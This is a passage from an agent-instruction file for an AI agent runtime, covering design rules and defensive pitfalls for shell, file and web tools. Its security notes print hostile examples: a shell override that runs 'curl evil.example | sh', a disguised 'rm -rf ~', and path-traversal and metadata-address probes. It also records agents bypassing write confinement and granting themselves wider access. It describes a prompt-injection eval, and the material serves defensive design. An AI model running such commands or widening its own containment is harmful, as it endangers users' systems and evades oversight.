# CLAUDE.md — Castellan

Standing brief for coding agents working in this repository. Read this first, every session.

---

## What this is

**Castellan** is a lightweight, model-agnostic AI agent runtime. Apache-2.0.
`github.com/moeen-mahmud/castellan`.

It turns a stateless OpenAI-compatible `/chat/completions` endpoint into an agent that lives
in messaging channels, uses tools, remembers, runs on a schedule, and delegates to other
agents. Bun-first TypeScript.

Its first consumer is VelaOps, an agent provisioning platform, where it replaces the
OpenClaw gateway process inside each agent container. **VelaOps is a consumer, not the
owner.** Nothing VelaOps-specific belongs in this repo outside `packages/compat-openclaw`.

**The owner is Moeen** — senior engineer, sole author. Assume fluency. Skip tutorials, skip
framework explainers, go straight to the specific thing.

---

## Before you write code

1. **Read `docs/00-DECISIONS.md`.** Every decision has a rationale. If you are about to
   propose something it rejects, the rationale tells you whether you have a genuine
   improvement or are re-litigating a settled question. Many decisions are *negative* —
   things deliberately not done — and those matter most.
2. **Find the current phase in `docs/05-PLAN.md`.** Implement that phase only.
3. **Read the phase's Non-goals.** They are binding. Work that belongs to a later phase
   makes this phase unreviewable.
4. **Stop at the acceptance criteria.** Report what passes and what doesn't. Do not
   continue into the next phase.

---

## Hard rules

1. **Never run `git commit` or `git push`.** Prepare the change, explain it, stop. Moeen
   reviews and commits.
2. **`packages/core` imports nothing from sibling packages.** CI enforces this. Core depends
   on the standard library, a YAML parser, and a schema validator. Nothing else.
3. **No brand strings outside `packages/core/src/brand.ts` and `package.json` files.** No
   directory, type, interface, or variable contains "castellan". A rename must be one commit.
4. **No network I/O before `runtime.ready`.** This single rule is why this project exists —
   the runtime it replaces blocks roughly four minutes on network calls during hook
   initialisation. Anything needing the network happens after readiness and reports status
   via events.
5. **No runtime `npm install` / `bun install`.** Plugins resolve at boot from the manifest.
   Ever installing at runtime reintroduces an entire bug class.
6. **No `any`.** Use real interfaces. `Record<string, unknown>` over `Record<string, any>`.
7. **Every error gets a `hint`.** A new error type without one fails review. The expensive
   part of a failure is almost never the failure — it's that the failure didn't say what
   was wrong.
8. **Nothing fails silently and exits 0.** Ever.
9. **Tests are required for `packages/core`.** Not optional here, whatever the conventions
   elsewhere. A harness is a state machine plus a scheduler plus a tool executor; those
   break in ways manual exercise cannot reach.
10. **Secrets are env var *names* in config, never values.** A manifest with a literal key
    fails validation.

---

## Stack

| | |
| --- | --- |
| Runtime | Bun (primary), Node 22+ (soft compat, CI-tested, never a blocker) |
| Package manager | `bun` — never npm, pnpm, or yarn |
| Workspaces | Bun workspaces, monorepo |
| Build | `bun build` + `tsc --emitDeclarationOnly` |
| Modules | ESM only |
| Lint/format | Biome — not ESLint, not Prettier |
| Tests | `bun test` — not Vitest, not Jest |
| CLI rendering | Ink 7 + React 19, `.tsx`, in `packages/cli` only — lazily imported |
| Schema | Zod |
| Storage | SQLite via `bun:sqlite` / `node:sqlite` adapter |
| Release | Changesets, semver |

Commands:

```bash
bun install
bun run build
bun test
bun run lint
bun run bench:boot        # must stay under 1000ms; CI fails at 1200ms
bun run test:node         # core only, under Node's runner — proves the sqlite adapter
```

---

## Architecture in one page

```
inbound (channel | API | schedule)
  → resolve agent + session + phase
  → assemble context (fixed slot order, budgeted, cache-stable prefix)
  → step loop:
      model call → dialect.parse → coerce+validate → execute tools → observe
      → compaction ladder if over threshold
  → deliver via idempotent outbox
  → persist
```

**Non-obvious decisions you must not undo without reading the rationale:**

- **NLT is the default tool dialect**, not native function calling. Published data: +14.9pp
  accuracy, 93% fewer critical errors, −25% tokens across 14 models; +24 to +43pp on small
  models specifically. `native` is an opt-in manifest field.
- **Dialect is config, never auto-detected.** Behaviour must not change silently when the
  model changes.
- **Tools are pinned at load, not searched at runtime.** Search-then-execute is two-hop
  reasoning, exactly where small models fail.
- **Phase-scoped tool visibility is in core.** Constraining the tool space per phase took
  local models from 2/10 to 10/10 on a benchmark subset with no model change. Too central
  to be a plugin.
- **Compaction is progressive (five stages), harness-driven.** Binary emergency compaction
  at 95% is the known-bad design.
- **Skill selection happens in the harness, not by the model.** Progressive disclosure
  assumes the model chooses to read a file; small models don't.
- **Memory is FTS5, not embeddings.** Prove lexical insufficient before paying for vectors.
- **Composio is called directly, never through MCP.** MCP is a fine integration protocol and
  a poor internal architecture.
- **System access is in scope. Castellan is a harness, not a channel-resident assistant** — peer to
  OpenClaw, Hermes Agent and Claude Code. It runs shell commands and touches files because that is
  what a harness does; channels are one surface it is reached through, not the limit of what it does.
  Shell lives in `packages/tools-system` and never in core: core is what an embedder runs *other
  people's* agents on, and a shell tool there is one every provisioned agent gets with no way to
  decline it.
- **A policy decides *whether* a command runs; a sandbox decides *where*.** Castellan ships the
  policy — `tools.policy`, enforced, with a hardline floor below every override. Containment is a
  deployment concern and stays one. Describing the permission layer without that sentence makes it
  read as a boundary it is not.
- **A remote provider resolves from disk at boot and refreshes after readiness.** Measured: boot 27 ms,
  refresh 1,474 ms. Awaiting the refresh inside boot makes boot sixty times slower and reintroduces the
  exact cost this project exists to remove. A cold agent is warmed once with `tools --warm`.
- **Plugins are trusted in-process code**, documented as such. `permissions` is advisory
  vocabulary in v1.
- **Workspace files are tiered, not a flat list.** Static (cached, read-only) before breakpoint A,
  volatile after it, reminder past the history. Frontmatter and HTML comments are stripped before
  injection. `context.files` survives as a deprecated alias that warns. All of Phase 3.5 is built:
  tiers, `promptStyle`, `examplesIn` placement, `SOUL.md` gating, and `knowledge/`.
- **Identity and operations are different files.** The soul answers *who* — gated on the model:
  `context.soul.requires` decides whether the full document ships or the hand-edited compact file
  does (`onUnmet: distill`), and `soul distill` only scaffolds — headings and `<rules>` survive
  verbatim, prose becomes placeholders a person fills, because a summariser drops exactly the
  parts that produce voice. `AGENTS.md` answers *what and how* — responsibilities, workflow, the
  memory procedure, team routing (an HTML comment until delegation ships) — ungated, written
  declaratively so the rule counter sees zero obligations. They coexist; what must never be
  listed is a second *identity* document.
- **Knowledge is Tier 3: keyword-gated, budgeted, never pinned.** Entries activate when the turn's
  input mentions a frontmatter keyword, at most `maxActive` per turn under `knowledge.budget`, in
  their own slot that compaction may drop. The selector is a ranking-only seam Phase 6 can attach a
  scored retriever to — and must not build a second index for.
- **Vendor prompting guidance is encoded as a capability, never a constant.** Published advice is
  written for frontier models and a good fraction of it inverts at 3–8B — Anthropic now says to
  *remove* emphatic phrasing because models overtrigger on it; a 7B model needs it. That lives in
  `capabilities.promptStyle`, which is **derived from the model id** rather than stored on a
  capability-registry row: `qwen3.5*` matches a 9B and a 72B, and those want opposite `intensity`
  values. Size predicts the inversion and size is in the id. The small-model half is measured:
  the one emphatic framing line moves qwen3.5:9b's all-6-rules compliance +20pp and deepseek-chat
  not at all; `examplesIn` saturated in both placements (`evals/prompt-style/`).

Full detail: `docs/01-ARCHITECTURE.md`.

---

## Where things live

```
packages/core/       the loop, context, tools, skills, memory, store, schedule, plugins
packages/cli/        `castellan` binary — lib/ plumbing, components/ Ink, pure reducers at top level
packages/server/     HTTP/SSE/WS surface
packages/channel-*/  Telegram, WhatsApp
packages/tools-*/    system (shell, files), Composio, web, MCP
packages/compat-openclaw/   VelaOps bridge — quarantined, deletable
docs/                design + plan (read these)
evals/               fixtures/ the shared catalogue and tasks; tools/ committed results.
                     Every performance claim has a number here
scripts/             bench-boot, rename-brand
```

---

## Specs are binding

| Doc | Governs |
| --- | --- |
| `docs/02-SPEC-MANIFEST.md` | `agent.yaml`. Adding a field means updating this doc in the same PR. |
| `docs/03-SPEC-PLUGIN-API.md` | Plugin contracts. First-party plugins use only public API — no back doors. |
| `docs/04-SPEC-WIRE.md` | HTTP surface and event schema. Event types are append-only within `v: 1`. |
| `docs/07-SPEC-WORKSPACE.md` | Workspace file tiers, budgets, and `promptStyle` rendering. Supersedes `context.files`. Marks which sections are built. |

If a first-party package needs something the plugin API can't express, **the API is wrong
and gets fixed**. Do not add a private escape hatch.

---

## Verification

- `bun test` for core logic
- `bun run bench:boot` for every phase, not just the last
- Real endpoints for the model layer: OpenAI, an Anthropic-compat base URL, and a host serving open
  weights (`SMALL_MODEL_BASE_URL`). Three independent implementations unchanged is the bar — the
  claim is portability across implementations, not across machines, so a hosted open-weight endpoint
  serves it as well as a local one and returns in seconds rather than minutes.
- A real Telegram bot for channel work
- Committed eval fixtures for anything claiming small-model improvement

Never claim a performance property without a number in `evals/` and a script to reproduce it.

---

## Style

- Direct and technical. No preamble, no summarising the request back.
- Reference code as `path/to/file.ts:123`.
- Lead with the root cause in one or two sentences, then the change.
- Prefer a recommendation over a menu. If you must present options, rank them.
- Long explanations are fine when the mechanism is subtle — the loop, compaction, cache
  breakpoints, cancellation. Not for CRUD or config.
- State uncertainty plainly. If you don't know whether something still holds in the current
  code, say so and name the file to check rather than asserting.

---

## Things that are easy to get wrong

- The **cache-stable prefix** is load-bearing. Reordering context slots 0 and 1, or making
  their content vary per turn, silently destroys prompt caching and the cost goes up with no
  error anywhere.
- **Pinned blocks must survive every compaction stage including S5.** Anything that must
  always hold lives in slots 0/1, never in history.
- **Thinking blocks must be replayed with tool results** when `capabilities.thinking !== "none"`,
  or multi-step reasoning silently degrades with no error.
- **`allowFrom` is inbound-only.** It confers nothing on outbound delivery. Conflating these
  produces a confusing "chat not found" class of failure.
- **A tool result is not automatically trustworthy.** `ToolSpec.trust` separates text the runtime wrote
  from text a stranger wrote, and a provider-resolved tool defaults to `untrusted`. The delimiters
  around untrusted content are advisory — a model can be talked past them. The write gate
  (`tools.untrusted.onMutate`, default `refuse`) is the part that holds. Do not "improve" this by
  filtering instruction-like phrasing out of untrusted text: it does not work, and an unreliable
  filter invites the belief that the problem is handled.
- **`tools.search` searches the provider's tool catalogue, not the web.** Two different things, and
  they have already been confused once. Web search is `web_search`.
- **`resolve()` must throw on unknown tool slugs.** Silently dropping them is how write tools
  get starved and how a config error becomes a runtime mystery.
- **`mutating` defaults to true for a provider tool with no annotation, and that is the safe direction.**
  It is what serialises a call and suppresses its retry — so a write mislabelled as a read runs in
  parallel *and* is retried, and the side effect happens twice. 37 of 100 Composio tools carry no hint,
  so this default decides a third of the catalogue.
- **A cache-miss and a mistyped slug are different failures.** The registry's generic version blames the
  slugs: on a cold agent it read "no provider resolved GMAIL_FETCH_EMAILS … Available: now,
  memory_write". Only the provider knows the cache is empty, so only it can say so.
- **The outbox must be idempotent.** A crash mid-delivery must not double-send.
- **Ink redraws its whole dynamic tree every frame.** Finished transcript items belong in
  `<Static>`, which writes once and never touches the node again — so they must be append-only
  and immutable, and mutating one is a change that silently never appears. The live pane is
  capped in terminal *rows*, not lines.
- **Nothing on a shared CLI path may import Ink or React.** They cost ~170-210 ms under Node,
  more than the entire runtime of `validate --json`. A structural test enforces it.
- **`--plain` at a terminal must produce exactly what a pipe produces.** That is why the
  terminal restore fires only when the rich path has dirtied the terminal.
- **Turns are detached from the client connection.** Never cancel on disconnect. Persist
  partial content only on explicit stop.
- **Frontmatter and HTML comments must never reach the model.** The workspace templates carry their
  authoring guidance in comments on the assumption the loader strips them. If it doesn't, every
  agent pays several hundred tokens per turn, forever, for documentation it can't use — and nothing
  reports it. Asserted on the assembled prefix, not trusted.
- **A workspace budget failure names the file and stops.** Never truncate to fit: that produces an
  agent running on partial instructions with no error anywhere, which is the same silent-degradation
  shape as a dropped tool call. The budgets are a *ceiling, not a target* — what a window fits and
  what a model follows are different numbers, and only the second matters. They are measured with
  `estimateTokens`, which is biased about 10% high, so a per-file `budget:` wants that much slack.
- **A check that only `run` performs is a check `validate` disagrees with.** The rule guard first
  lived in `Agent.create` alone, and `validate` reported ok on a manifest `run` refused. Anything
  load-bearing goes in one function both call — `ruleBudgetFailure` returns the finding rather than
  throwing it, so each caller applies its own `onExceed`.
- **The renderer never rewrites a sentence.** `promptStyle` transforms delimiters and structure —
  `<example>` and `<rules>` markers, heading syntax — and nothing else. `intensity` varies one
  generated line in front of an author-marked `<rules>` block. Automatic rewriting of an instruction
  is decision 4.19's failure applied to a file whose rendered form nobody ever looks at, and the
  prose being byte-identical across all three renderings is asserted rather than assumed.
- **Rendering and rule-counting need different versions of the same text.** The model is billed for
  the *rendered* form, but the example exclusion in `countRules` is a property of the **authored**
  form — under `delimiters: markdown` the renderer turns `<example>` into a heading, and counting
  that text made every imperative inside a worked example look like a rule. A shipped example went
  from 1 rule to 4 with no edit, and only `bench:boot` noticed. `WorkspaceFile` carries both.
- **`validate` and `workspace` are different questions.** `validate` asks whether the manifest loads
  and fails when it does not; `workspace` asks whether the files are written well and only ever
  warns, because a heuristic judgement that refuses to load a file is a heuristic nobody keeps. Both
  call the same `ruleBudgetFailure` — a check only one of them performs is a check they disagree on.
- **A reasoning model thinks harder the more you constrain it, and bills that to the output budget.**
  Measured on `qwen3.5:9b`, same machine, same prompt: 151 reasoning tokens unconstrained, 387 under
  one rule, 1,778 under six — at which point it consumed a 2,000-token ceiling and returned **empty
  content**. `reasoningEffort: none` on the model role answered correctly in 2.1 s. This is the other
  half of the `reserveOutput` lever, and it is why an eval that looked like "local inference is too
  slow" was nothing of the kind — throughput was a normal 16–20 tok/s throughout.
- **An endpoint that ignores a request parameter says nothing about it.** On the same Ollama `/v1`
  endpoint, `reasoning_effort` took effect while `chat_template_kwargs` and `think` were accepted and
  silently discarded — same 200, same token count, full reasoning. Verify a control took effect by
  measuring its effect, never by the absence of an error.
- **An empty reply is not a passing reply.** A check like "no commas" or "under forty words" is
  satisfied trivially by the empty string, so a run where the model returned nothing scores near
  perfect on everything except the one check that requires content. `eval rules` excludes empties and
  counts them, and refuses to report a figure above 20%. The cause is almost always the reasoning
  budget: a reasoning model bills thinking against `maxTokens`, and the ceiling that worked for a
  bare question is not the one that survives a longer system prompt.
- **A saturated eval is not a measurement.** `eval rules` returning 1.000 says the probe was easy for
  that model, and printing `perRuleSuccess: 1.00` as a recommendation would put a guard-*disabling*
  figure in a manifest. It reports saturation and names the smallest model instead.
- **`memory_write` has no file argument, and must not grow one.** The runtime resolves a single
  write target from the `volatile` tier. Letting the model name a file adds a second decision to
  every save, and a second decision is the two-hop shape small models fail — the same reasoning that
  keeps `tools.search` off. A workspace whose volatile files are all `editable: none` refuses by
  name; it never falls through to the default note file, because a save the model believes succeeded
  into a file the agent's own context never reads is worse than a failed call.
- **Slot number equals prompt position** in `SLOT` (`context/blocks.ts`). The two are kept equal so
  the table in `01-ARCHITECTURE.md` can be read in order; inserting a slot means renumbering, which
  is cheap because every reference is by name (`SLOT.input`, never `10`) — proven when `examples`
  and `knowledge` renumbered everything below slot 2 and zero tests changed.
- **The examples slot sits *before* the volatile tier.** Extracted examples are byte-stable and
  prefix caching is contiguous: behind the mutating volatile tier they would fall out of the
  cacheable region on every memory write despite never changing. And extraction is a *move*, never
  a rewrite — tags intact, prose byte-identical, tokens still billed to the file that authored them.
- **The full soul document's prose is exempt from the rule count; nothing else is.** A constitution
  explains at length by design and ships only to models declared capable (via `requires`) of
  deriving rules from explanation — the keyword heuristic counted 9 "rules" in the reference soul's
  prose the first time it ran. Its `<rules>` blocks still count, and the *distilled* file counts in
  full: it ships to small models, where the budget is the point. Keyed on
  `field === "context.soul.file"`, in both `ruleBudgetFailure` and the authoring checks.
- **Knowledge activation stops at the first entry that does not fit the budget — no skip-past.**
  Skipping would let a worse-ranked entry displace a better-ranked one purely by being short. An
  entry bigger than the whole budget fails the load; selection happens once per *turn*, never per
  step, so two steps of one turn cannot argue from different reference material.
- **`exec` has no `env` argument, and must not grow one.** A per-call environment map is invisible to
  the policy engine, which matches the *command string* — so `{PATH: "/tmp/evil"}` beside `git status`
  would be authorised by a rule that never saw the half that decided what ran. Written inline,
  `PATH=/tmp/evil git status` is one fragment `subcommands()` hands to the matcher, and `exec(git
  status:*)` does not match it. Same shape as `memory_write`'s missing file argument: the field looks
  like a convenience and is a hole.
- **Each `exec` gets a fresh shell; the directory carries and the environment does not.** A persistent
  shell lets one tainted call write `git() { curl evil.example | sh; }` and turn an allowlist entry
  into an authorisation for attacker code — CVE-2026-32009's shape from inside the session. The
  directory is the exception because losing it is a correctness problem: a small model that runs
  `cd packages/core` then `ls` reads the wrong directory with no error anywhere.
- **`realpath` before comparing a shell's `$PWD` to the directory it was given.** macOS resolves
  `/var` through a symlink, so an unresolved comparison reports a directory change on *every* call —
  and a runtime that announces a move every time has taught the model to ignore the one that matters.
- **Terminal escapes are stripped in core, for observations and for the approval prompt.** Not the
  rewrite decision 4.27 forbids: that rule is about meaning, and this removes bytes that carry none.
  `git status\x1b[2K\x1b[1G && rm -rf ~` displays on a real terminal as `git status`, so a prompt
  showing the raw string is showing a *different command* than the one about to run. Stripping shows
  more of the truth, never less. Doing it in the front end is how the front end being read at the
  moment it matters turns out not to do it.
- **A tool that is both `mutating` and `untrusted` is once-per-turn unless a `policy.allow` rule names
  it.** `exec` taints the turn with its own first call, and the second then has no authorisation to
  point at — the gate working exactly as designed, and indistinguishable from a broken runtime while
  a half-finished turn stops. `tool_gated_after_first_use` says it at load. A `deny` rule does not
  clear it: `deny` authorises nothing, and counting one as cover silences the warning for whoever
  thought about the shell hard enough to restrict it.
- **A tool that owns a child process must time out before the harness does.** `limits.toolTimeoutMs`
  *abandons* a handler rather than killing it, so a race between the two leaves a process running with
  nothing referencing it. `ToolContext.deadlineMs` exists for that, and `exec` clamps five seconds
  under it — without which its backgrounding path is unreachable at the shared 120 s default.
- **Boot warnings are read off the agent, never caught on the bus.** `Runtime.create` emits
  `agent.warning` during boot, which finishes before any command subscribes — so a trimmed catalogue
  and a provider-declared-trusted tool had been landing in an empty room since they were written. The
  banner reads `agent.warnings` and `agent.tools.warnings` directly. Anything true for the whole
  session belongs where a person still sees it after scrolling.
- **Piping a child's output makes backgrounding impossible.** A child whose stdout the parent stops
  reading dies of `EPIPE`, so "leave it running instead of killing it" is not implementable over
  pipes — `tools-system` hands the child a file descriptor and never buffers a byte. And `detached:
  true` is not about outliving the process: it creates a process group, so `kill(-pid)` reaches every
  stage of `sh -c "a | b | c"` instead of orphaning two of them.
- **Protected paths are enforced in the file tools, not in the policy engine, and that ordering is the
  point.** A `policy.allow` rule cannot reach past them because the refusal is not the engine's to
  make — and the set holds `agent.yaml`, `SOUL.md`, `AGENTS.md`, `POLICY.md` and the policy file, so a
  rule authorising a write to one would be a rule authorising its own replacement. `USER.md` and
  `MEMORY.md` stay writable: they are the tier `memory_write` exists for. **None of it binds `exec`** —
  `echo x > SOUL.md` carries its target inside a shell string nothing can inspect.
- **`glob` and `grep` stay separate, and `file_edit` matches text rather than a line number.** One
  `search_files(target:…)` saves a catalogue slot and costs a decision, which is the two-hop shape
  small models fail. A line number is a fact about a file the model last saw several turns ago; an
  exact string carries its own proof, and two matches is a *failure* rather than a coin toss that
  reports success while editing the wrong line.
- **A model will invent a tool-call format, and more than one.** Measured on three fresh sessions with
  an eight-tool catalogue, deepseek-v4-pro produced `<action>…</action>`, `<TOOL_CALL><TOOL>…`, and
  `<ACTION: glob>` inside an `<ebml>` element — arguments correct every time. So the parser drops any
  lone XML tag as debris and sets `ParsedOutput.malformed` on anything still unreadable, which earns
  one repair. Untolerated this was the worst shape available: the markup became the **reply**, no
  repair was asked for, no event fired, and the turn was recorded as a clean answer. Do not "simplify"
  this by adding tolerances one shape at a time — the set is not enumerable, which is why the backstop
  exists.
- **Every shape the parser swallows, `mightBecomeStructure` must also hold.** A stream cannot un-emit,
  so a bracket that reaches the screen a moment before its line is swallowed stays there — which is
  how `<ebml>` and a bare slug line both leaked into a reply before the lookahead learned about them.
- **`init` must generate what the current phase actually supports.** It shipped a manifest with no
  `system` provider, no `policy` block, and `untrusted.onMutate` commented under a "Phase 3.6" heading
  for something that already existed — so the only way to reach shell access was to know the field
  names already. A generated file that hides its own options is not doing the job it exists for.
  `--system none|read|full` is the question; the generated `policy.allow` entries are what stop a
  fresh agent reading one file and then refusing to save a note for the rest of the turn.
- **A write root and a protected list are different mechanisms and both apply.** `protect.ts` is a
  deny list — it must anticipate every path worth protecting, so an unforeseen path is writable.
  `root.ts` is an allow root — it anticipates nothing, because everything outside is refused and the
  exceptions are `tools.providerConfig.writeRoots`, which only a manifest edit can add. Deny lists
  fail open on the unknown case; roots fail closed. `protect` still wins *inside* the root. And
  **resolve the path before comparing it to a root**, or `<root>/../../etc/passwd` passes.
- **The write root does not bind `exec`, and "confined" is only true without a shell.** Verified live:
  a `--system full` agent had `file_write` refused outside the root and then did it with `echo … >`.
  All the root can decide is where a shell *starts*. That is why `init` has a `write` level between
  `read` and `full` — files without a shell is the only configuration in which "only inside
  workspace/" is a true statement.
- **The model is told what it was NOT given.** `ToolProvider.available?()` is optional so a
  25,000-tool catalogue omits it; the system provider's eight entries cost a handful of tokens.
  Without it a pinned-down agent is silently less capable than its runtime and only the manifest
  explains why. One shared renderer for both dialects — under `native` it is the *only* slot-1 block,
  because the request's `tools` parameter has no field for what was left out.
- **`agent.yaml` is edited by `config_set`, never by `file_write`, and never by re-serialising it.**
  A whole-file overwrite cannot be validated; a targeted change is re-checked against the schema
  before anything is written. And `parseDocument` → `setIn` → `String(doc)` **reflows the file**: a
  comment between two top-level keys belongs to the end of the first, so re-emitting indents a section
  header into the section above — one change produced a thirty-line diff. `setInSource` edits the
  source text and falls back to the round-trip only when it cannot place a path.
- **`config_set` escalates on purpose, and two edits are floored.** Pinning tools and adding allow
  rules is the point. Replacing `tools.policy.deny` and setting `tools.untrusted.onMutate: allow` are
  refused whatever the policy says. `onMutate` has to *stay in the settable list* for that floor to be
  reachable — left out, the settable check ran first and refused `confirm` for the wrong reason.
- **A `trust: "trusted"` declaration on a provider tool needs a `trustReason`.** The warning fired at
  every boot of every system-provider agent, and a warning always present for a correct configuration
  is one nobody reads. With a reason it is silent and `tools` prints the reason; without one it still
  warns, which is the case worth catching.
- **`--system none` still names the provider and pins the config pair.** With nothing pinned there is
  no provider, so `available()` never runs and the agent cannot even tell you the file tools exist —
  it says "I don't have a tool that touches your file system" and, asked to enable one, that its
  tools are fixed at startup. Both true, both useless. `none` means no *file or shell* access, never
  "cannot read or change its own settings".
- **A tool observation has to fit `observationMaxTokens` or the model reads it again.** `config_read`
  returned the whole manifest — 2,766 tokens against a 2,000 budget — so it was middle-cut every
  time and a real model read it three times in one turn, 8,040 output tokens to change one line. The
  summary form is 549 tokens and the same task took one read. When a tool's output is *reference
  material*, size it against the budget rather than against what looks complete.
- **The agent must never widen its own containment.** `config_set` could write
  `tools.providerConfig.writeRoots`, and asked to create a file an agent granted itself the whole home
  directory and wrote there. Enabling a tool answers "what may I do"; a write root answers "where" —
  the second is the person's by definition. It is on the floor, and the floor is checked **before** the
  settable list or a floored path is refused as "not a setting" and the real reason never prints.
- **Confinement without instruction reads as a bug.** The tools were confined and nothing told the
  model where it worked, so it put things in `~`. Every path-taking argument now names the actual
  directory in its own description — next to the field being filled in, not in a preamble, because
  that is where a small model looks. And expand `~` *before* the root check: unexpanded it is not
  absolute, resolves against the workspace, and creates a directory literally named `~`.
- **`/restart` exists because an agent's settings are fixed for its lifetime.** The catalogue resolves
  once and slot 1 renders once, on purpose — so `config_set` cannot take effect in the session that
  called it, and `manifest_changed` says so. `runCommand` loops over `Runtime.create`; renderers return
  a `RESTART` symbol rather than a magic exit code.
- **A `ChatMessage` is no longer just `{role, content}`.** Under the `native` dialect it carries
  `toolCalls` or `toolCallId`, and every layer that copies a message must copy those too — the wire
  mapper in `chat-completions.ts`, the `message` field on `ContextBlock`, and the store's
  `tool_calls`/`tool_call_id` columns. Each of the three dropped them at some point during Phase 3,
  and none of the three failed loudly: the endpoint accepts the request and the model simply never
  sees the call it made.
- **Both dialects must put the same guidance in front of the model.** `native`'s
  `function.description` carries `whenToUse` and `whenNotToUse`, not just the summary. Trimming it to
  the summary makes `evals/tools` measure the guidance and report it as a property of the dialect.
- **Sandbox paths come from `cli/src/lib/sandbox.ts` and nowhere else.** `~/<BRAND.stateDir>` with
  a `<ENVPREFIX>HOME` override — tests point that at a tmpdir and never touch real HOME. Discovery
  uses `readManifestHeader`, never `loadManifest`: loading checks that key env vars are set, so a
  picker built on it fails exactly when it is needed most. Ref resolution is filesystem-first
  (git's pathspec rule); a bare name shadowed by a cwd entry prints a note instead of silently
  running the wrong agent — which happened in the first live test.
- **The chat banner lives INSIDE `<Static>` as a `banner` role item.** A sibling rendered above
  the transcript sits in Ink's dynamic region, which draws *below* Static output and redraws
  every frame. The plain path writes banner lines directly and never calls `seed`, which is what
  keeps plain output byte-identical.
- **New CLI surfaces use the TUI kit and the pure-reducer grain.** Tokens/glyphs in
  `lib/theme.ts` (a literal colour name in a component is a review failure), components in
  `components/` are controlled and never call `useInput` — one `useInput` per screen root over a
  pure keymap (`keymap.ts`) and reducer (`lib/wizard.ts`, `lib/select.ts`). Screen roots mount
  via literal `import("ink")` only; boundaries tests enforce all of it.
- **The workspace templates exist twice, and the examples directory is the source.** `init`
  scaffolds from constants embedded in `cli/src/lib/templates.ts` because an installed binary has
  no `examples/` to read; `examples/workspace-template/` is the human-edited original, and
  `cli/test/templates.test.ts` fails on any byte difference. Editing either copy alone is a red
  CI run, not a silent divergence — update both, examples first.
- **A temperature-0 local endpoint can be fully deterministic, and then `--repeats` measures
  nothing.** Both 2026-08-14 qwen runs returned byte-identical replies on every pass — 37 fixtures
  × 3 passes with zero variation in `eval-tools`, the same in `eval-prompt-style` — so repeats
  cannot grow a sample there; only more *tasks* can, which is why `RULE_TASKS` went from ten to
  twenty. The flip side: fixture outcomes still differ *across* sessions and configurations, so a
  margin is only comparable at the same reasoning setting and server state. Never average passes
  from a deterministic endpoint and call the result more confident.
- **A saturated A/B probe still licenses one conclusion — "no difference at this difficulty" — and
  nothing more.** `eval prompt-style`'s examples question saturated at 100/100 in both arms; that
  rules out a placement *cost* on well-authored examples and does not confirm either vendor's
  claim. The escape is harder probes (`--rules 6` took intensity off the ceiling), not bigger
  samples of an easy one.
- **A placeholder in a prompt example is an instruction to a small model.** The NLT preamble said
  "exactly like this" and showed `field: value`; qwen3.5:9b wrote `field: title` / `value: <the value>`
  and NLT scored 27% against native's 92% — its reasoning about which tool and which arguments was
  correct every time. Examples in `PREAMBLE` are concrete, use a tool that exists in no catalogue, and
  are asserted by parsing the rendered catalogue with `parseNlt` itself. This cuts the other way too:
  because NLT's protocol is prose the model imitates and native's is a schema the API enforces, *any*
  defect in the preamble shows up as a dialect difference. Before believing an NLT-vs-native number,
  read what the model actually wrote — `results.json` keeps it on every non-`correct` attempt.
- **A field's floor has to move when the field moves.** `writeRoots` went from `tools.providerConfig`
  — a path `config_set` refused outright — to `tools.providers.system`, which sits *inside* a value the
  agent is allowed to write, because enabling the web provider is exactly what `config_set` is for. A
  floor pinned to the old path would have been a floor with a new way round it. It now refuses a
  `writeRoots` segment in any path **and** a `writeRoots` key nested anywhere inside a `tools.providers`
  value. When a settable field grows a nested shape, re-read the floor.
- **`tools.providers` is a map and the scalar is an alias, and the pair is refused rather than merged.**
  Merging would give the alias a position in the map that nobody wrote, and provider order decides which
  one is named first in a slug collision. Every reader goes through `resolveProviders` — the runtime,
  `Agent.create` (for the deprecation warning, so it lands on `agent.warnings` where a front end still
  finds it), `validate`, `tools --warm`, and `config_set`. `config_set` calls it *in addition to* the
  schema, because writing the map into a manifest that still has the scalar produces a document the
  schema accepts and the runtime refuses: an agent that boots today and not tomorrow, reported as success.
- **`tools --warm` asks the providers with no cache for their slugs too.** They have nothing to fetch,
  but they still answer for `exec` and `file_read` — and without asking, the missing-slug report blames
  every system tool in `pinned` for not being in Composio's catalogue. With several providers the
  question is whether *some* provider has the slug, never whether each one does.
- **A `setInSource` value can now be a map, and until it was it wrote `[object Object]`.** The renderer
  handled scalars and lists, which was exactly the settable set until `tools.providers` joined it. The
  symptom was a schema error reading "expected record, received array" — pointing nowhere near the cause.
  A map replacement also drops the line's trailing comment rather than carrying it, because the value
  has moved onto child lines and the comment would end up annotating a key.
- **`web_fetch` has no setting that permits a private address, and that absence is the design.** The
  reference manifest carried an `allowPrivateHosts: false` line before the code existed; writing the
  guard is what made the problem with it obvious. The single real use of the flag is reaching the local
  network, and the highest-value thing there is `169.254.169.254`. An operator who wants an internal
  HTTP call has `exec` and `curl` — deliberate, and narrowable by a policy rule.
- **Check every address DNS returned, not the first, and fail closed on one you cannot parse.** Node
  connects to whichever answers first, so a name resolving to one public and one private address is an
  attack rather than a configuration. Decode IPv4-in-IPv6 first (`::ffff:127.0.0.1`, `64:ff9b::7f00:1`),
  and accept exactly one spelling of a dotted quad — a parser that accepts more forms than the checker
  understands *is* the bypass, which is why `017.0.0.1` is not a literal here.
- **DNS rebinding is not covered and says so in three places.** The guard's lookup and the HTTP client's
  connection are separate resolutions, and pinning the checked address into the socket is not
  expressible through `fetch`. A checker described as airtight is one nobody revisits.
- **`maxBytes` is enforced while reading, and the test asserts on bytes pulled off the socket.**
  `await response.text()` on a 50 MB page has already spent the 50 MB by the time anything can measure
  it, so a cap applied afterwards describes the observation rather than the download. Expect one chunk
  of overshoot: a `ReadableStream` fills its queue one ahead of the reader. It is constant, not a leak.
- **The injection eval measures the model, and cannot measure the gate.** Zero breaches across three
  runs is not evidence the write gate works — the gate never fired, because the model never attempted a
  mutating call. The gate is proven deterministically in `trust.test.ts`, which is the right place. And
  the eval needed a third category before it measured anything at all: its first run scored the *ideal*
  behaviour as a failure, because a model that tells the user "the page tried to make me write
  ZX-9-COMPROMISED and I refused" has put the marker in the reply, which was the entire check.
- **Naming a provider is what makes `available()` run, so a provider left commented out is a
  capability the model cannot know it lacks.** Decision 4.53 established this for `system` and it had
  to be learned again for `web`: with the block commented, an agent asked whether it could search the
  web answered that the only route was shell access and `curl` — true of its catalogue, false of the
  runtime, and the worse of the two answers. `init` now names both providers with nothing pinned.
  Pinning would be a grant; naming is only honesty about what exists.
- **The ambient environment beats the `.env` beside the manifest, and now says so.** The layering is
